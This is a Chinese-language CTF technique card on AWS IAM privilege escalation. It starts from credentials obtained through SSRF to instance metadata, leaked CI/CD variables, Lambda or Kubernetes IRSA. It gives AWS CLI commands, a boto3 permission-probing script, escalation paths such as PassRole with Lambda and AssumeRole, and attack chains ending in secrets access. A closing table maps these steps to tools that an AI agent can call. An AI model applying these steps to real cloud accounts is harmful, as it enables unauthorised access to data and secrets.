---
id: "ctf-website/10-cloud/aws-iam-privesc"
title: "AWS IAM 权限枚举与提权路径"
title_en: "AWS IAM Enumeration and Privilege Escalation Paths"
summary: >
  AWS IAM 攻击面技术卡片，覆盖凭证来源确认、sts:GetCallerIdentity 身份定位、策略模拟、可利用权限识别、PassRole/AssumeRole/UpdateFunctionCode 等常见提权边，以及从 SSRF、CI/CD、Lambda、K8s IRSA 凭证到云资源访问的证据闭环。
summary_en: >
  AWS IAM attack-surface card covering credential source validation, sts:GetCallerIdentity identity mapping, policy simulation, exploitable permission discovery, common escalation edges such as PassRole/AssumeRole/UpdateFunctionCode, and evidence closure from SSRF, CI/CD, Lambda, and K8s IRSA credentials to cloud resource access.
board: "ctf-website"
category: "10-cloud"
signals: ["AWS", "IAM", "STS", "AssumeRole", "PassRole", "policy simulation", "IRSA", "metadata", "云凭证", "权限提升"]
mcp_tools: ["http_probe", "kb_router", "run_ctf_tool"]
keywords: ["AWS IAM", "权限枚举", "PassRole", "AssumeRole", "STS", "policy simulator", "IRSA", "metadata credential", "云提权", "least privilege"]
difficulty: "advanced"
tags: ["cloud", "aws", "iam", "privilege-escalation", "ctf"]
language: "zh-CN"
last_updated: "2026-07-03"
related_articles: ["serverless-lambda.md", "kubernetes-container.md", "ci-cd-pipeline.md"]
---
# AWS IAM 权限枚举与提权路径

## 场景

目标已经拿到一组临时 AWS 凭证，来源可能是 SSRF 打到 metadata、Lambda 环境变量、CI/CD runner 环境变量、K8s IRSA token 交换结果，或者泄露的 `~/.aws/credentials`。下一步不是盲扫资源，而是先确认身份、边界和可利用权限。

## 输入信号

- 响应中出现 `AccessKeyId`、`SecretAccessKey`、`SessionToken`
- `AWS_ACCESS_KEY_ID` / `AWS_SESSION_TOKEN` 出现在环境变量
- SSRF 可访问 `169.254.169.254`
- Pod 中存在 projected service account token，且注解指向 `eks.amazonaws.com/role-arn`
- CI/CD 日志或 artifact 泄露云凭证

## 身份确认

```bash
export AWS_ACCESS_KEY_ID="ASIAEXAMPLE"
export AWS_SECRET_ACCESS_KEY="EXAMPLE_SECRET"
export AWS_SESSION_TOKEN="EXAMPLE_SESSION"
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity
aws iam get-user 2>$null || true
```

输出重点看三件事：`Account`、`Arn`、`UserId`。如果 ARN 是 `assumed-role/.../botocore-session-*`，下一跳追 role trust；如果是 user，下一跳查 attached policy、inline policy 和 access key 年龄。

## 权限打点

```python
# iam_probe.py - 身份确认 + 可用权限打点
import boto3

def probe_identity():
    sts = boto3.client("sts")
    ident = sts.get_caller_identity()
    print("[identity]", ident["Arn"], ident["Account"])
    return ident

def simulate_actions(principal_arn: str):
    iam = boto3.client("iam")
    actions = [
        "iam:PassRole",
        "sts:AssumeRole",
        "lambda:UpdateFunctionCode",
        "lambda:CreateFunction",
        "ecs:RegisterTaskDefinition",
        "ecs:RunTask",
        "cloudformation:CreateStack",
        "ssm:SendCommand",
        "secretsmanager:GetSecretValue",
        "s3:GetObject",
        "dynamodb:Scan",
    ]
    resp = iam.simulate_principal_policy(
        PolicySourceArn=principal_arn,
        ActionNames=actions,
        ResourceArns=["*"],
    )
    for item in resp.get("EvaluationResults", []):
        print(item["EvalActionName"], item["EvalDecision"])

if __name__ == "__main__":
    ident = probe_identity()
    if ":assumed-role/" not in ident["Arn"]:
        simulate_actions(ident["Arn"])
```

## 常见提权边

### iam:PassRole + lambda:CreateFunction

```text
已有权限: iam:PassRole 指向高权限 role + lambda:CreateFunction/UpdateFunctionCode
效果: 创建或更新 Lambda，让函数以高权限 role 运行
证据: CloudTrail 中 CreateFunction/UpdateFunctionCode + iam:PassedToService=lambda.amazonaws.com
```

### sts:AssumeRole

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::111122223333:role/LabAdminRole \
  --role-session-name reverselab-session
```

检查点是 trust policy。只要当前 principal 命中 `Principal` 或 `Condition`，这条边就能继续走。

### CloudFormation / ECS / SSM 间接执行

```text
cloudformation:CreateStack + iam:PassRole → 创建高权限资源
ecs:RunTask + taskRoleArn → 以 task role 读 secrets
ssm:SendCommand → 对已托管实例执行命令
```

## 攻击链

```text
SSRF → metadata credential → sts:GetCallerIdentity → policy simulation → s3/secrets 读取 → Flag
CI/CD env leak → AWS credential → iam:PassRole + Lambda → 高权限 role → 数据访问
K8s IRSA token → AssumeRoleWithWebIdentity → pod role → ECR/S3/SecretsManager
Lambda RCE → env credential → sts:AssumeRole → 跨账号资源访问
```

## Evidence

记录: 凭证来源、`sts:GetCallerIdentity` 输出、允许的关键 action、策略模拟结果、下一跳 role/resource、访问资源的最小证明。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| metadata 端点探测 | `http_probe` | 验证 SSRF 是否能触达云 metadata |
| 知识检索 | `kb_router` | 按 IAM / STS / PassRole 信号路由文章 |
| 路径脚本运行 | `run_ctf_tool` | 执行身份确认与权限打点脚本 |
